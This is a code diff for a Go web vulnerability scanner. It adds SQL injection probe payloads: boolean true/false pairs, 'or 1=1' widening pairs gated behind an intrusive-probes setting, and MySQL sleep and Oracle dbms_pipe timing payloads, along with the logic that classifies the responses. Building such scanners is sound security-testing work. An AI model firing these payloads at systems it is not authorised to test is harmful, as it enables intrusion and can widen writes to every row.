@@ -17,10 +17,12 @@ package scanner
 //
 // # Which dialects, honestly
 //
-// Only PostgreSQL and SQL Server timing banks are recoverable in the decompile; Burp's MySQL
-// and Oracle timing payloads are not, so burpsy sends none. The selection layer already says
-// so: MySQL specific and Oracle specific stay in the declined list with their reason, and a
-// run that enables them is told burpsy will not run them rather than quietly pretending.
+// Only PostgreSQL and SQL Server timing banks are recoverable in the decompile. Burp's MySQL and
+// Oracle timing payloads are not, so those two banks are the documented standard forms (MySQL's
+// sleep() inside XOR(if(now()=sysdate(),…)), Oracle's dbms_pipe.receive_message), labelled as such
+// where they are built — the same convention the boolean cores follow. They were declined until
+// a Juice Shop benchmark (docs/JUICE-SHOP-BENCHMARK-2026-10-10.md) showed what declining a whole
+// dialect costs: an engine burpsy has no probe for is an engine it reports clean.
 //
 // # How each family is gated
 //
@@ -70,6 +72,33 @@ var sqlQuotedBooleanPairs = [][2]string{
 	{"' and 1=1-- ", "' and 1=2-- "},
 	{`" and "1"="1`, `" and "1"="2`},
 	{"') and ('1'='1", "') and ('1'='2"},
+	// A value inside a LIKE pattern, `LIKE '%seed%'`: the application's own wildcard and quote
+	// follow the payload, so the condition's last literal has to absorb a `%` too — `'1%'='1%'`
+	// is true, where the plain pair above renders `'1'='1%'`, false in both halves, and reads as
+	// a clean answer. That is how Juice Shop's product search escaped the boolean technique.
+	{"%' and '1%'='1", "%' and '1%'='2"},
+	{`%" and "1%"="1`, `%" and "1%"="2`},
+	// Deeper nesting than the single `')` above: close the literal and every paren the
+	// application opened, then comment out the rest. sqlmap's boundary set reaches the same
+	// prefixes (its "')" / "'))" boundaries); these are the standard spellings, not its bytes.
+	{"') and 1=1-- ", "') and 1=2-- "},
+	{"')) and 1=1-- ", "')) and 1=2-- "},
+	{"')) and (('1'='1", "')) and (('1'='2"},
+}
+
+// sqlOrBooleanPairs widen the WHERE clause instead of narrowing it, for the statement whose
+// baseline matched nothing — a failed login, a lookup of an unknown id. There an `and` pair can
+// only leave "nothing" unchanged in both halves, while `or 1=1` turns it into "everything" and
+// `or 1=2` leaves it as it was. The differential is inverted (the false half matches the
+// baseline, see ClassifyOrDifferential), and so is the risk: on an UPDATE or DELETE, `or 1=1`
+// widens the write to every row. These pairs therefore run only when the run admits intrusive
+// checks (CheckContext.IntrusiveProbes) — the same switch an operator uses to keep XML entity
+// expansion off a production target.
+var sqlOrBooleanPairs = [][2]string{
+	{"' or 1=1-- ", "' or 1=2-- "},
+	{`" or 1=1-- `, `" or 1=2-- `},
+	{"') or 1=1-- ", "') or 1=2-- "},
+	{" or 1=1-- ", " or 1=2-- "},
 }
 
 // sqlBooleanPayloads renders the always-true / always-false pair for each context.
@@ -143,6 +172,22 @@ func sqlTimingPayloads(delay time.Duration) []sqlTimingPayload {
 			form("'"+brk, "waitfor delay'0:0:%d'--", mssqlMethods),
 		)
 	}
+	// MySQL / MariaDB: not recoverable from Burp, so these are the documented standard forms. The
+	// sleep sits inside XOR(if(now()=sysdate(),…,0)) so it runs whatever the row's other conditions
+	// say — `and sleep()` would sleep only when the row already matched — and a quoted form closes
+	// the application's literal and reopens one for the application's own closing quote.
+	mysqlMethods := []string{MethodTimeDelays, MethodMySQLSpecific}
+	out = append(out, form("", " XOR(if(now()=sysdate(),sleep(%d),0))", mysqlMethods))
+	for _, q := range []string{"'", `"`} {
+		out = append(out, form(q, " XOR(if(now()=sysdate(),sleep(%d),0)) XOR "+q, mysqlMethods))
+	}
+	// Oracle: dbms_pipe.receive_message waits on a pipe nobody writes to for the given seconds, and
+	// needs no privilege beyond the default PUBLIC grant. Concatenated, bare and quoted.
+	oracleMethods := []string{MethodTimeDelays, MethodOracleSpecific}
+	out = append(out,
+		form("||", "dbms_pipe.receive_message(('a'),%d)", oracleMethods),
+		form("'||", "dbms_pipe.receive_message(('a'),%d)||'", oracleMethods),
+	)
 	return out
 }
 
@@ -163,14 +208,30 @@ func sqlTimingPayloads(delay time.Duration) []sqlTimingPayload {
 // would have been tripled by three separate checks of the same type).
 func blindInjectionPointProbes(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint) []InjectionProbe {
 	var probes []InjectionProbe
+	proven := false
 	for _, pair := range sqlBooleanPayloads() {
 		if ctx.Err() != nil {
 			return probes
 		}
-		pr := sqlBooleanProbe(ctx, h, p, pair[0], pair[1])
+		pr := sqlBooleanProbe(ctx, h, p, pair[0], pair[1], false)
 		probes = append(probes, pr)
 		if pr.Evidence == InjectionEvidenceBooleanDifferential {
+			proven = true
 			break // a proven differential; the further break styles ask the same question
+		}
+	}
+	// The widening pairs only where the run admits intrusive probes, and only while nothing is
+	// proven: an `and` differential already answered the question with a read-only condition.
+	if !proven && h.intrusive {
+		for _, pair := range sqlOrBooleanPairs {
+			if ctx.Err() != nil {
+				return probes
+			}
+			pr := sqlBooleanProbe(ctx, h, p, pair[0], pair[1], true)
+			probes = append(probes, pr)
+			if pr.Evidence == InjectionEvidenceBooleanDifferential {
+				break
+			}
 		}
 	}
 	// A baseline already slow relative to the delay makes every timing probe undecidable; one
@@ -202,7 +263,12 @@ func blindInjectionPointProbes(ctx context.Context, h *ProbeHarness, p bcheck.In
 // Both halves changing the response is a clean answer for SQL injection, not an undecided one: the
 // payload was rejected or reflected, not interpreted, and a reflecting parameter would otherwise
 // never count as clean for the light-audit tier or the effectiveness prior.
-func sqlBooleanProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, truePayload, falsePayload string) InjectionProbe {
+//
+// widening marks an `or` pair (sqlOrBooleanPairs), whose differential runs the other way: the
+// always-false half keeps the baseline and the always-true half changes it. The classifier and the
+// repeat rule are the same ones with the halves swapped, plus one guard of its own — a widened
+// statement that errors (5xx) is a broken query, not a wider match, and must not count.
+func sqlBooleanProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, truePayload, falsePayload string, widening bool) InjectionProbe {
 	out := InjectionProbe{Payload: truePayload + " / " + falsePayload}
 	if h.withhold(MethodBooleanConditions, 2) {
 		return withheldProbe(p, out.Payload, MethodBooleanConditions)
@@ -219,7 +285,15 @@ func sqlBooleanProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoi
 	if err == nil {
 		var f1 ResponseFingerprint
 		if f1, err = fingerprint(falsePayload); err == nil {
-			switch ClassifyBooleanDifferential(base, t1, f1) {
+			keep, change := t1, f1 // the half that must match the baseline, and the half that must not
+			if widening {
+				keep, change = f1, t1
+			}
+			verdict := ClassifyBooleanDifferential(base, keep, change)
+			if widening && verdict == InjectionEvidenceBooleanDifferential && t1.Status >= 500 {
+				verdict = InjectionEvidenceInconclusive
+			}
+			switch verdict {
 			case InjectionEvidenceBooleanDifferential:
 				var base2, t2, f2 ResponseFingerprint
 				if base2, err = fingerprint(""); err == nil {
@@ -230,9 +304,16 @@ func sqlBooleanProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoi
 				if err != nil {
 					break
 				}
-				if confirmBooleanDifferential(base, base2, t1, f1, t2, f2) {
+				confirmed := confirmBooleanDifferential(base, base2, t1, f1, t2, f2)
+				if widening {
+					confirmed = confirmBooleanDifferential(base, base2, f1, t1, f2, t2) && t2.Status < 500
+				}
+				if confirmed {
 					out.Evidence = InjectionEvidenceBooleanDifferential
 					out.Detail = fmt.Sprintf("%s %q: always-true kept the response, always-false changed it, twice, against a stable baseline", p.Kind, p.Name)
+					if widening {
+						out.Detail = fmt.Sprintf("%s %q: an always-false `or` kept the response and an always-true `or` widened it, twice, against a stable baseline", p.Kind, p.Name)
+					}
 				} else {
 					out.Evidence = InjectionEvidenceNone
 					out.Detail = fmt.Sprintf("%s %q: a differential appeared once and did not repeat against a stable baseline", p.Kind, p.Name)
